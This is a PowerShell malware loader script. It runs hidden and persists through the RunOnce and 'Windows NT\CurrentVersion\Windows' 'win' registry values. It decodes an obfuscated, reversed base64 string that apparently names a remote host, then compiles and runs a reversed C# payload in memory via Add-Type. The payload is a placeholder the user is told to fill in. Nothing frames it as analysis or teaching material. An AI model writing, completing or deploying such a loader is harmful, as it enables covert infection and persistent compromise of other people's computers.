powershell -nop -w hidden -c "
$c = 'conhost.exe --headless powershell -nop -w hidden -c ' + [char]34 + $MyInvocation.MyCommand + [char]34;

Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'windows' -Value 'conhost.exe --headless powershell -nop -w hidden -c cmd /c (Get-ItemProperty -Path ''HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows'').win';

Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows' -Name 'win' -Value $c;

$f = 'ask=' + '=gClRmL' + '0V2b' + 'tFm' + 'blk=';
$d = $f.Substring(3,16).ToCharArray();
[array]::Reverse($d);
$y = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(($d -join '')));

$g = '<REVERSED_CSHARP_BLOB>';  # REPLACE this with your reversed C# payload blob (same as before)
$l = $g.ToCharArray();
[array]::Reverse($l);

Add-Type -TypeDefinition ($l -join '');
[B]::ma($y.Trim())
"
